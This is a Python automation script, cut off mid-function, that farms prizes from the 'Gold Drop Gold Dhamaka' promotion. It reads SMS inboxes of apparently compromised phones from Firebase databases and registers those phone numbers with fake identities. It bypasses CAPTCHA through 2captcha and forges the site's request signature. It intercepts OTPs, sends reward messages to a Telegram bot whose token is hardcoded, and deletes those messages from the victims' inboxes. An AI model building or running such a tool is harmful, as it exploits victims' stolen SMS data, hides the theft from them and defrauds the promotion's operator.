#!/usr/bin/env python3
"""
Gold Drop Gold Dhamaka - Automated Checker

Scans Firebase devices for active numbers, confirms a number with a Zomato OTP,
then runs the Gold Drop raw API flow (create -> get-start -> register -> verify-otp).
A win is decided server-side in the verify-otp response; the full decoded response
is saved and reported to Telegram. No browser automation, no state files.

No processed.txt, no burned_phones.txt. Attempt counters live in memory only and
reset when the process restarts.
"""

import os
import sys
import re
import json
import time
import random
import hashlib
import hmac
import base64
import html
import threading
import signal
import uuid
import urllib.parse
from datetime import datetime, timezone, timedelta

import requests
import urllib3
from flask import Flask, render_template, request, jsonify, redirect, url_for

urllib3.disable_warnings()

if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

# ─── Data directory (Railway volume) ───────────────────────────────────────
# On Railway, set DATA_DIR to the mount path of a persistent volume. Locally it
# defaults to the current directory, so behaviour is unchanged when not deployed.
DATA_DIR = os.environ.get("DATA_DIR", os.getcwd())
os.makedirs(DATA_DIR, exist_ok=True)


def data_path(name):
    return os.path.join(DATA_DIR, name)


ENV_FILE = data_path(".env")


def load_env_file():
    """Minimal .env reader — no extra dependency."""
    values = {}
    if os.path.exists(ENV_FILE):
        try:
            with open(ENV_FILE, "r", encoding="utf-8") as handle:
                for line in handle:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "=" not in line:
                        # Accept a bare 2captcha key file (key only, no KEY= prefix).
                        if re.fullmatch(r"[A-Za-z0-9]{20,}", line):
                            values["TWOCAPTCHA_KEY"] = line
                        continue
                    key, value = line.split("=", 1)
                    values[key.strip()] = value.strip().strip("\"'")
        except Exception:
            pass
    return values


ENV_VALUES = load_env_file()
TWOCAPTCHA_KEY = (os.environ.get("TWOCAPTCHA_KEY", "").strip()
                  or ENV_VALUES.get("TWOCAPTCHA_KEY", "").strip()
                  or ENV_VALUES.get("KEY", "").strip())
TURNSTILE_SITEKEY = "0x4AAAAAAGE1rl5Luu7yDEl0"
TURNSTILE_URL = "https://golddropgolddhamaka.com/register"
TWOCAPTCHA_CREATE_URL = "https://api.2captcha.com/createTask"
TWOCAPTCHA_RESULT_URL = "https://api.2captcha.com/getTaskResult"
TOKEN_BUDGET = int(os.environ.get("TOKEN_BUDGET", "2000") or ENV_VALUES.get("TOKEN_BUDGET", "2000"))
TOKENS_USED = 0
TOKEN_LOCK = threading.Lock()


# ─── Configuration ──────────────────────────────────────────────────────────

GOLD_BASE = "https://golddropgolddhamaka.com"

TG_BOT_TOKEN = "6908653973:AAEYy_bhVTY1y2OVwYhM2RfCU4m10chXeV0"
TG_CHAT_ID = "1007758627"

LINKS_FILE = data_path("link.txt")
HITS_FILE = data_path("gold_hits.json")
SETTINGS_FILE = data_path("settings.json")
INSTANCES_FILE = data_path("gold_instances.json")

# Observed BigCity sender: VK-BGCITY-T / VM-BGCITY-T / JM-BGCITY-T
BIGCITY_SMS_PATTERN = "BGCITY"
BIGCITY_OTP_TIMEOUT = 65
BIGCITY_POLL_INTERVAL = 3

ZOMATO_OTP_TIMEOUT = 12
ZOMATO_POLL_INTERVAL = 3

NUM_WORKERS = 3
ATTEMPTS_PER_NUMBER = int(os.environ.get("ATTEMPTS_PER_NUMBER", "5")
                         or ENV_VALUES.get("ATTEMPTS_PER_NUMBER", "5"))
BATCH_CODE = "KKD2LS01261026"

# Skip a device once it has this many BigCity messages dated today.
BIGCITY_DAILY_LIMIT = int(os.environ.get("BIGCITY_DAILY_LIMIT", "5")
                          or ENV_VALUES.get("BIGCITY_DAILY_LIMIT", "5"))

# Persisted device marker: devices already used today ( IST date ). Written when
# a number on the device returns the participation response, so restarts skip
# them for the rest of that day. A new calendar date makes them eligible again.
DEVICE_MARKS_FILE = data_path("device_day_marks.json")

# Empty ipInfo is accepted by the live endpoint. If the server ever starts
# enforcing geography, replace this with the Telangana ipInfo object from the
# original prefetch capture. Nothing else in the flow needs to change.
IP_INFO_PAYLOAD = {}

IST = timezone(timedelta(hours=5, minutes=30))

# Real pincodes inside 500001-509412 (Telangana), harvested from
# api.postalpincode.in and filtered to the live range. Rotated per registration.
PINCODES = [
    500001, 500002, 500004, 500005, 500013, 500020, 500026, 500028, 500030,
    500036, 500037, 500039, 500041, 500042, 500044, 500057, 500059, 500060,
    500066, 500074, 500080, 500083, 500084, 500093,
    501101, 501111, 501218, 501506, 501509,
    502001, 502102, 502103, 502109, 502110, 502249, 502279, 502310, 502313,
    502345, 502371,
    503001, 503002, 503003, 503111, 503112, 503174, 503185, 503230, 503301,
    504001, 504101, 504103, 504104, 504106, 504203, 504208, 504209, 504296,
    504309,
    505001, 505172, 505184, 505301, 505327, 505455,
    506002, 506003, 506008, 506013, 506134, 506135, 506145, 506303, 506330,
    506342, 506367,
    507001, 507002, 507003, 507134, 507203, 507209, 507304,
    508001, 508105, 508212, 508213, 508224, 508238, 508248, 508253, 508255,
    508278, 508284,
    509001, 509103, 509202, 509209, 509210, 509217,
]

FIRST_NAMES = [
    "Amit", "Rajesh", "Suresh", "Manoj", "Vikram", "Deepak", "Arun", "Sanjay",
    "Ramesh", "Prakash", "Rakesh", "Mukesh", "Kiran", "Anand", "Vinod",
    "Priya", "Sunita", "Kavita", "Rekha", "Neha", "Pooja", "Ritu", "Anjali",
    "Meena", "Geeta", "Savita", "Asha", "Usha", "Seema", "Nisha", "Divya",
    "Sneha", "Shruti", "Aarti", "Swati", "Komal", "Preeti", "Lata", "Mamta",
]

LAST_NAMES = [
    "Sharma", "Gupta", "Patel", "Singh", "Kumar", "Verma", "Joshi", "Mishra",
    "Agarwal", "Srivastava", "Yadav", "Chauhan", "Pandey", "Mehta", "Shah",
    "Das", "Roy", "Nair", "Reddy", "Rao", "Iyer", "Pillai", "Menon", "Naidu",
    "Chowdhury", "Bose", "Banerjee", "Kulkarni", "Desai", "Shetty",
]

EMAIL_DOMAINS = ["gmail.com", "gmail.com", "gmail.com", "outlook.com", "yahoo.com"]
SIGN_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# 285-byte 1x1 white JPEG. Proven against Opella's register endpoint on the
# same backend. Gold Drop server acceptance is confirmed by the first live run.
TINY_JPEG = bytes([
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
    0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08, 0x07, 0x07, 0x07, 0x09,
    0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D, 0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12,
    0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F, 0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20,
    0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C, 0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29,
    0x2C, 0x30, 0x31, 0x34, 0x34, 0x34, 0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32,
    0x3C, 0x2E, 0x33, 0x34, 0x32, 0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01,
    0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xFF, 0xC4, 0x00, 0x1F, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0xFF, 0xC4, 0x00, 0xB5, 0x10, 0x00, 0x02, 0x01, 0x03,
    0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00, 0x01, 0x7D,
    0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06,
    0x13, 0x51, 0x61, 0x07, 0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xA1, 0x08,
    0x23, 0x42, 0xB1, 0xC1, 0x15, 0x52, 0xD1, 0xF0, 0x24, 0x33, 0x62, 0x72,
    0x82, 0x09, 0x0A, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x25, 0x26, 0x27, 0x28,
    0x29, 0x2A, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x43, 0x44, 0x45,
    0x46, 0x47, 0x48, 0x49, 0x4A, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
    0x5A, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x73, 0x74, 0x75,
    0x76, 0x77, 0x78, 0x79, 0x7A, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
    0x8A, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0xA2, 0xA3,
    0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00, 0x7B, 0x94,
    0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD9,
])

# ─── Globals ────────────────────────────────────────────────────────────────

app = Flask(__name__)
logs = []
logs_lock = threading.Lock()
hits = []
hits_lock = threading.Lock()
ZOMATO_LOCK = threading.Lock()
ZOMATO_LAST_CALL = 0
RUNNING_FLAGS = {}
ACTIVE_THREADS = {}
PINCODE_LOCK = threading.Lock()
PINCODE_CURSOR = 0
REJECTED_PINCODES = set()

# In-memory optimisation state (no processed.txt / burned_phones.txt).
USED_NUMBERS = set()        # numbers that returned participation this process
USED_NUMBERS_LOCK = threading.Lock()
CLAIMED_NUMBERS = set()     # numbers currently being worked by a worker
CLAIMED_LOCK = threading.Lock()
DEVICE_MARKS_LOCK = threading.Lock()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36")


def release_claim(phone):
    with CLAIMED_LOCK:
        CLAIMED_NUMBERS.discard(phone)


# ─── Random Data ────────────────────────────────────────────────────────────

def random_name():
    return "%s %s" % (random.choice(FIRST_NAMES), random.choice(LAST_NAMES))


def random_email():
    first = random.choice(FIRST_NAMES).lower()
    last = random.choice(LAST_NAMES).lower()
    digits = random.randint(10, 99999)
    style = random.randint(0, 2)
    if style == 0:
        local = "%s.%s%d" % (first, last, digits)
    elif style == 1:
        local = "%s%s%d" % (first, last, digits)
    else:
        local = "%s%d" % (first, digits)
    return "%s@%s" % (local, random.choice(EMAIL_DOMAINS))


def reject_pincode(pincode):
    """Drop a pincode the server rejected. In-memory only, no state file."""
    if pincode is None:
        return
    try:
        with PINCODE_LOCK:
            REJECTED_PINCODES.add(int(str(pincode).strip()))
    except (TypeError, ValueError):
        pass


def next_pincode():
    global PINCODE_CURSOR
    with PINCODE_LOCK:
        available = [p for p in PINCODES if p not in REJECTED_PINCODES]
        if not available:
            log("All pincodes rejected; reusing full pool", "ERROR")
            available = PINCODES
        pin = available[PINCODE_CURSOR % len(available)]
        PINCODE_CURSOR += 1
        return str(pin)


# ─── Logging ────────────────────────────────────────────────────────────────

LOG_COLORS = {
    "INFO": "\x1b[90m",      # grey
    "ERROR": "\x1b[91m",     # red
    "NOREWARD": "\x1b[93m",  # amber - win_type none
    "WIN": "\x1b[92m",       # green - actual win
    "HIT": "\x1b[96m",       # cyan - reward SMS or other hit
}
ANSI_RESET = "\x1b[0m"


def log(msg, level="INFO"):
    ts = datetime.now(IST).strftime("%H:%M:%S")
    entry = "[%s] [%s] %s" % (ts, level, msg)
    color = LOG_COLORS.get(level, "")
    if color and sys.stdout.isatty():
        print(color + entry + ANSI_RESET, flush=True)
    else:
        print(entry, flush=True)
    with logs_lock:
        logs.append(entry)
        if len(logs) > 2000:
            logs.pop(0)


# ─── Telegram ───────────────────────────────────────────────────────────────

def send_telegram_alert(message):
    """Send a Telegram alert. Returns True only if Telegram confirmed delivery."""
    try:
        url = "https://api.telegram.org/bot%s/sendMessage" % TG_BOT_TOKEN
        r = requests.post(url, json={
            "chat_id": TG_CHAT_ID,
            "text": message[:4000],
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=15)
        if r.status_code == 200 and r.json().get("ok"):
            return True
        log("TG alert rejected: %s" % r.text[:200], "ERROR")
        return False
    except Exception as exc:
        log("TG alert error: %s" % exc, "ERROR")
        return False


# ─── File Helpers ───────────────────────────────────────────────────────────

def load_firebase_links():
    """Parse the Nexus export format in link.txt ("URL: <db>" blocks)."""
    if not os.path.exists(LINKS_FILE):
        return []
    urls = []
    with open(LINKS_FILE, "r", encoding="utf-8", errors="replace") as handle:
        for line in handle:
            line = line.strip()
            if not line.upper().startswith("URL:"):
                continue
            url = line.split(":", 1)[1].strip().rstrip("/")
            if url.startswith("http") and url not in urls:
                urls.append(url)
    return urls


def save_hit(hit):
    with hits_lock:
        hits.append(hit)
        try:
            existing = []
            if os.path.exists(HITS_FILE):
                with open(HITS_FILE, "r", encoding="utf-8") as handle:
                    existing = json.load(handle)
            existing.append(hit)
            with open(HITS_FILE, "w", encoding="utf-8") as handle:
                json.dump(existing, handle, indent=2, ensure_ascii=False)
        except Exception as exc:
            log("hit save error: %s" % exc, "ERROR")


def load_hits():
    if not os.path.exists(HITS_FILE):
        return []
    try:
        with open(HITS_FILE, "r", encoding="utf-8") as handle:
            data = json.load(handle)
            return data if isinstance(data, list) else []
    except Exception:
        return []


def today_key():
    """IST calendar date as YYYY-MM-DD; the rollover point is 00:00 IST."""
    return datetime.now(IST).strftime("%Y-%m-%d")


def load_device_marks():
    """Return {date: [device_id, ...]} from the volume."""
    with DEVICE_MARKS_LOCK:
        try:
            if os.path.exists(DEVICE_MARKS_FILE):
                with open(DEVICE_MARKS_FILE, "r", encoding="utf-8") as handle:
                    data = json.load(handle)
                if isinstance(data, dict):
                    return data
        except Exception:
            pass
    return {}


def device_marked_today(device_id):
    return str(device_id) in load_device_marks().get(today_key(), [])


def mark_device_used_today(device_id):
    """Persist a device under today's IST date. Older dates are pruned."""
    with DEVICE_MARKS_LOCK:
        try:
            data = {}
            if os.path.exists(DEVICE_MARKS_FILE):
                with open(DEVICE_MARKS_FILE, "r", encoding="utf-8") as handle:
                    loaded = json.load(handle)
                if isinstance(loaded, dict):
                    data = loaded
            key = today_key()
            devices = data.setdefault(key, [])
            if str(device_id) not in devices:
                devices.append(str(device_id))
            # keep only the last 7 calendar dates
            for old in sorted(data.keys())[:-7]:
                data.pop(old, None)
            with open(DEVICE_MARKS_FILE, "w", encoding="utf-8") as handle:
                json.dump(data, handle, indent=2)
        except Exception as exc:
            log("device mark save error: %s" % exc, "ERROR")


def attach_reward_sms(hit, text, msg_key):
    """Persist the SMS code into the saved hit before deleting the source message."""
    if not hit:
        return
    record = {
        "text": text,
        "message_key": str(msg_key),
        "received_at": datetime.now(IST).isoformat(),
    }
    stamp = hit.get("timestamp")
    with hits_lock:
        for entry in hits:
            if entry.get("timestamp") == stamp:
                entry["reward_sms"] = record
                break
        try:
            existing = []
            if os.path.exists(HITS_FILE):
                with open(HITS_FILE, "r", encoding="utf-8") as handle:
                    existing = json.load(handle)
            for entry in existing:
                if entry.get("timestamp") == stamp:
                    entry["reward_sms"] = record
                    break
            else:
                saved = dict(hit)
                saved["reward_sms"] = record
                existing.append(saved)
            with open(HITS_FILE, "w", encoding="utf-8") as handle:
                json.dump(existing, handle, indent=2, ensure_ascii=False)
        except Exception as exc:
            log("reward SMS save error: %s" % exc, "ERROR")


def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as handle:
                return json.load(handle)
        except Exception:
            pass
    return {"proxy": ""}


def get_proxy():
    """Railway env var wins; settings.json is the local/dashboard fallback."""
    for key in ("RAILWAY_PROXY", "PROXY_URL", "GOLD_PROXY"):
        value = os.environ.get(key, "").strip()
        if value:
            return value
    return load_settings().get("proxy", "")


def solve_turnstile():
    """Solve one Turnstile token via 2captcha. Tokens are single-use."""
    global TOKENS_USED
    if not TWOCAPTCHA_KEY:
        raise RuntimeError("TWOCAPTCHA_KEY is not set in .env or environment")
    with TOKEN_LOCK:
        if TOKENS_USED >= TOKEN_BUDGET:
            raise RuntimeError("2captcha token budget exhausted: %d" % TOKEN_BUDGET)

    task = {
        "type": "TurnstileTaskProxyless",
        "websiteURL": TURNSTILE_URL,
        "websiteKey": TURNSTILE_SITEKEY,
    }
    proxy = get_proxy()
    if proxy:
        parsed = urllib.parse.urlparse(proxy)
        task = {
            "type": "TurnstileTask",
            "websiteURL": TURNSTILE_URL,
            "websiteKey": TURNSTILE_SITEKEY,
            "proxyType": "http",
            "proxyAddress": parsed.hostname or "",
            "proxyPort": parsed.port or 80,
        }
        if parsed.username:
            task["proxyLogin"] = urllib.parse.unquote(parsed.username)
        if parsed.password:
            task["proxyPassword"] = urllib.parse.unquote(parsed.password)

    created = requests.post(TWOCAPTCHA_CREATE_URL, json={
        "clientKey": TWOCAPTCHA_KEY, "task": task,
    }, timeout=20).json()
    if created.get("errorId") != 0:
        raise RuntimeError("2captcha createTask failed: %s" % created.get("errorDescription", created))

    task_id = created.get("taskId")
    for _ in range(40):
        time.sleep(3)
        result = requests.post(TWOCAPTCHA_RESULT_URL, json={
            "clientKey": TWOCAPTCHA_KEY, "taskId": task_id,
        }, timeout=20).json()
        if result.get("errorId") != 0:
            raise RuntimeError("2captcha getTaskResult failed: %s"
                               % result.get("errorDescription", result))
        if result.get("status") == "ready":
            token = (result.get("solution") or {}).get("token", "")
            if not token:
                raise RuntimeError("2captcha returned no token")
            with TOKEN_LOCK:
                TOKENS_USED += 1
                used = TOKENS_USED
            log("Turnstile token solved (cost %s, used %d/%d)"
                % (result.get("cost", "?"), used, TOKEN_BUDGET))
            return token
    raise RuntimeError("2captcha solve timed out")


def is_token_error(error):
    text = str(error).lower()
    return "messageid': 'token'" in text or "messageid: token" in text or "security check" in text


def save_settings(settings):
    with open(SETTINGS_FILE, "w", encoding="utf-8") as handle:
        json.dump(settings, handle, indent=2)


def load_instances():
    if not os.path.exists(INSTANCES_FILE):
        return []
    try:
        with open(INSTANCES_FILE, "r", encoding="utf-8") as handle:
            data = json.load(handle)
            return data if isinstance(data, list) else []
    except Exception:
        return []


def save_instances(data):
    with open(INSTANCES_FILE, "w", encoding="utf-8") as handle:
        json.dump(data, handle)


hits = load_hits()


# ─── Gold Drop API ──────────────────────────────────────────────────────────

def gold_decode(response):
    """All Gold Drop API responses are wrapped: {"resp": "<base64 JSON>"}."""
    try:
        raw = response.json()
        if "resp" in raw:
            return json.loads(base64.b64decode(raw["resp"]).decode("utf-8"))
        return raw
    except Exception:
        return None


def gold_sign(payload, data_key):
    """Verified signing scheme, byte-exact against live prefetch + captured requests.

    key = dataKey[4:18]
    msg = b64(ts) + "." + b64(json(payload with t))
    W   = base64( hex(HMAC_SHA256(key, msg)) )   # base64 of hex chars, not raw digest
    sig = str(S) + str(v) + W[:v] + noise + W[v:]
    data = b64(ts) + "." + b64(json) + "." + sig
    """
    hmac_key = data_key[4:18]
    ts = int(time.time() * 1000)
    signed_payload = dict(payload)
    signed_payload["t"] = ts
    pj = json.dumps(signed_payload, separators=(",", ":"))
    ts_b64 = base64.b64encode(str(ts).encode()).decode()
    p_b64 = base64.b64encode(pj.encode()).decode()
    msg = ts_b64 + "." + p_b64
    hmac_hex = hmac.new(hmac_key.encode(), msg.encode(), hashlib.sha256).hexdigest()
    W = base64.b64encode(hmac_hex.encode()).decode()
    v = random.randint(1, 6)
    S = random.randint(2, 8)
    noise = "".join(random.choice(SIGN_ALPHABET) for _ in range(S))
    sig = str(S) + str(v) + W[:v] + noise + W[v:]
    return ts, ts_b64 + "." + p_b64 + "." + sig


def gold_verify_signature(data_field, data_key):
    """Offline self-check: parse a data field and recompute its signature."""
    try:
        ts_b64, p_b64, sig = data_field.split(".")
        S, v = int(sig[0]), int(sig[1])
        W = sig[2:2 + v] + sig[2 + v + S:]
        msg = ts_b64 + "." + p_b64
        hex_expected = hmac.new(data_key[4:18].encode(), msg.encode(), hashlib.sha256).hexdigest()
        W_expected = base64.b64encode(hex_expected.encode()).decode()
        return W == W_expected
    except Exception:
        return False


def gold_session(proxies=None):
    s = requests.Session()
    if proxies:
        s.proxies.update(proxies)
    s.headers.update({
        "user-agent": UA,
        "accept": "application/json",
        "origin": GOLD_BASE,
    })
    return s


def gold_create_session(proxies=None):
    """POST /api/users -> fresh userKey + dataKey. Empty ipInfo is accepted."""
    s = gold_session(proxies)
    r = s.post("%s/api/users" % GOLD_BASE, json=IP_INFO_PAYLOAD, timeout=20)
    d = gold_decode(r)
    if not d or d.get("statusCode") != 200 or "userKey" not in d or "dataKey" not in d:
        raise RuntimeError("Create user failed: %r" % (d,))
    user_key = d["userKey"]
    data_key = d["dataKey"]
    s.cookies.set("gold-drop-id", str(user_key), domain="golddropgolddhamaka.com")
    return s, user_key, data_key


def gold_get_start(session, user_key):
    r = session.post(
        "%s/api/users/get-start/%s" % (GOLD_BASE, user_key),
        data="",
        headers={"content-type": "application/json", "referer": GOLD_BASE + "/"},
        timeout=20,
    )
    d = gold_decode(r)
    if not d or d.get("statusCode") != 200:
        raise RuntimeError("get-start failed: %r" % (d,))
    return d


def gold_register(session, user_key, data_key, phone, name, email, pincode, token=None):
    """Multipart register. Signature covers seven text fields incl. Turnstile token."""
    payload = {
        "name": name,
        "mobile": phone,
        "email": email,
        "pincode": pincode,
        "code": BATCH_CODE,
        "terms_accepted": "1",
        "userKey": str(user_key),
        "token": token or "",
    }
    ts, data_field = gold_sign(payload, data_key)
    r = session.post(
        "%s/api/users/register/%s?t=%s" % (GOLD_BASE, user_key, ts),
        data={"data": data_field},
        files={"img": ("photo.jpg", TINY_JPEG, "image/jpeg")},
        headers={"origin": GOLD_BASE, "referer": GOLD_BASE + "/register"},
        timeout=30,
    )
    d = gold_decode(r)
    if not d or d.get("statusCode") != 200:
        raise RuntimeError("Registration failed: %r" % (d,))
    return d


def gold_verify(session, user_key, data_key, otp):
    """JSON POST (not form-encoded) -> decoded response with win_type / reward."""
    ts, data_field = gold_sign({"otp": otp, "userKey": str(user_key)}, data_key)
    r = session.post(
        "%s/api/users/verify-otp/%s?t=%s" % (GOLD_BASE, user_key, ts),
        json={"data": data_field},
        headers={
            "content-type": "application/json",
            "accept": "application/json",
            "origin": GOLD_BASE,
            "referer": GOLD_BASE + "/otp",
        },
        timeout=30,
    )
    d = gold_decode(r)
    if not d or d.get("statusCode") != 200:
        raise RuntimeError("OTP verification failed: %r" % (d,))
    return d


def classify_win(decoded):
    """Winner if win_type exists and is not 'none'. Reward shape is not assumed."""
    win_type = decoded.get("win_type")
    return ((win_type is not None and str(win_type).strip().lower() != "none")
            or decoded.get("reward") is not None)


USED_TODAY_MARKERS = (
    "try again tomorrow",
    "same number",
    "participation",
    "already participated",
    "already registered",
    "already completed",
    "already used",
)


def is_used_today_error(error):
    """True for the server's 'already used today' participation response."""
    text = str(error).lower()
    return any(marker in text for marker in USED_TODAY_MARKERS)


def is_pincode_error(error):
    """True when the server rejects the pincode field ('messageId': 'pincode')."""
    text = str(error).lower()
    return "messageid" in text and "pincode" in text


CONNECTION_ERROR_MARKERS = (
    "proxyerror",
    "unable to connect to proxy",
    "tunnel connection failed",
    "gateway time-out",
    "gateway timeout",
    "httpsconnectionpool",
    "max retries exceeded",
    "connectionerror",
    "connection aborted",
    "connection reset",
)


def is_connection_error(error):
    """Proxy/network failures are routine — log them, never alert Telegram."""
    text = str(error).lower()
    return any(marker in text for marker in CONNECTION_ERROR_MARKERS)


# ─── Firebase Functions ─────────────────────────────────────────────────────

_PHONE_PATTERNS = [
    re.compile(r'(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|BSNL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(?:\+?91[-\s]?)([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
]


def fetch_firebase(url, timeout=10):
    try:
        r = requests.get(url, timeout=timeout)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def fetch_clients(db_url):
    return fetch_firebase("%s/clients.json" % db_url.rstrip("/")) or {}


def fetch_messages(db_url, device_id, limit=150):
    return fetch_firebase(
        '%s/messages/%s.json?orderBy="$key"&limitToLast=%d'
        % (db_url.rstrip("/"), device_id, limit)
    ) or {}


def delete_firebase_message(db_url, device_id, msg_key):
    """Delete one message node from the Firebase inbox. Direct connection, no proxy."""
    url = "%s/messages/%s/%s.json" % (db_url.rstrip("/"), device_id, str(msg_key))
    try:
        r = requests.delete(url, timeout=15)
        return r.status_code == 200
    except Exception as exc:
        log("Message delete error: %s" % exc, "ERROR")
        return False


def message_text(msg):
    return str(msg.get("message", "") or msg.get("body", "") or msg.get("text", "") or "")


def message_sender(msg):
    return str(msg.get("sender", "") or msg.get("from", "") or "")


def is_bigcity_message(msg):
    return (BIGCITY_SMS_PATTERN in message_sender(msg).upper()
            or "Team BigCity" in message_text(msg)
            or "Team Big City" in message_text(msg))


def parse_message_date(msg, key):
    """Return a date for a Firebase message, from dateTime or the epoch-ms key."""
    raw = str(msg.get("dateTime", "") or "").strip()
    if raw:
        head = raw.split("|", 1)[0].strip()
        for fmt in ("%d-%m-%Y", "%d/%m/%Y", "%Y-%m-%d"):
            try:
                return datetime.strptime(head, fmt).date()
            except ValueError:
                pass
    try:
        return datetime.fromtimestamp(int(key) / 1000.0, IST).date()
    except Exception:
        return None


def bigcity_count_today(db_url, device_id):
    """Count BigCity messages dated today (IST). Evaluated at device visit, so
    the count resets automatically when the calendar date rolls over at 00:00."""
    today = datetime.now(IST).date()
    count = 0
    for key, msg in fetch_messages(db_url, device_id).items():
        if not isinstance(msg, dict) or not is_bigcity_message(msg):
            continue
        if parse_message_date(msg, key) == today:
            count += 1
    return count


def extract_phone_from_device(device_data):
    raw = device_data.get("mobNo", "")
    if not raw or str(raw) in ("", "-", "None"):
        sims = device_data.get("sims")
        if sims and isinstance(sims, dict):
            sims = list(sims.values())
        if sims and isinstance(sims, list) and sims and isinstance(sims[0], dict):
            raw = sims[0].get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        raw = device_data.get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        return ""
    mobile = str(raw).replace("+91", "").replace(" ", "").replace("-", "").strip()
    if len(mobile) == 10 and mobile.isdigit() and mobile[0] in "6789":
        return mobile
    return ""


def extract_phone_from_sms(text):
    for pattern in _PHONE_PATTERNS:
        m = pattern.search(text)
        if m and m.group(1):
            digits = re.sub(r"[^0-9]", "", m.group(1))
            if len(digits) == 10 and digits[0] in "6789":
                return digits
            if len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
                return digits[2:]
    return None


def extract_phones_from_messages(db_url, device_id):
    phones = set()
    for _, msg in fetch_messages(db_url, device_id).items():
        if not isinstance(msg, dict):
            continue
        phone = extract_phone_from_sms(message_text(msg))
        if phone:
            phones.add(phone)
    return list(phones)


def get_last_message_key(db_url, device_id):
    data = fetch_firebase(
        '%s/messages/%s.json?orderBy="$key"&limitToLast=1'
        % (db_url.rstrip("/"), device_id)
    )
    if isinstance(data, dict) and data:
        return list(data.keys())[-1]
    return ""


def poll_firebase_for_otp(db_url, device_id, sender_pattern, timeout, interval, last_key=None):
    if last_key is None:
        last_key = get_last_message_key(db_url, device_id)
    start = time.time()
    while time.time() - start < timeout:
        time.sleep(interval)
        try:
            data = fetch_messages(db_url, device_id, 20)
            for msg_key, msg in data.items():
                if msg_key <= last_key or not isinstance(msg, dict):
                    continue
                if sender_pattern in message_sender(msg).upper() or "Team BigCity" in message_text(msg):
                    otp_match = re.search(r"\b(\d{6})\b", message_text(msg))
                    if otp_match:
                        return otp_match.group(1)
        except Exception:
            pass
    return None


def watch_reward_sms(db_url, device_id, after_key, hit, seconds=90):
    """Watch for the reward SMS, save + alert it, then remove it from the inbox."""
    deadline = time.time() + seconds
    seen = set()
    while time.time() < deadline:
        time.sleep(BIGCITY_POLL_INTERVAL)
        try:
            for msg_key, msg in fetch_messages(db_url, device_id, 20).items():
                if msg_key <= after_key or msg_key in seen or not isinstance(msg, dict):
                    continue
                if is_bigcity_message(msg):
                    seen.add(msg_key)
                    text = message_text(msg)
                    text_lower = text.lower()
                    if "otp" in text_lower and "register" in text_lower:
                        continue  # the OTP SMS itself, not the reward notice
                    log("  Reward SMS: %s" % text, "HIT")
                    attach_reward_sms(hit, text, msg_key)
                    delivered = send_telegram_alert(
                        "📩 <b>GOLD DROP REWARD SMS</b>\n"
                        "📟 Device: <code>%s</code>\n"
                        "💬 <pre>%s</pre>" % (html.escape(device_id), html.escape(text))
                    )
                    if delivered:
                        if delete_firebase_message(db_url, device_id, msg_key):
                            log("  Reward SMS deleted from Firebase (key %s)" % msg_key, "HIT")
                        else:
                            log("  Reward SMS deletion failed (key %s)" % msg_key, "ERROR")
                    else:
                        log("  Reward SMS kept in inbox: Telegram delivery failed", "ERROR")
        except Exception:
            pass


# ─── Zomato OTP ─────────────────────────────────────────────────────────────

def zomato_send_otp(phone, proxies=None):
    global ZOMATO_LAST_CALL
    with ZOMATO_LOCK:
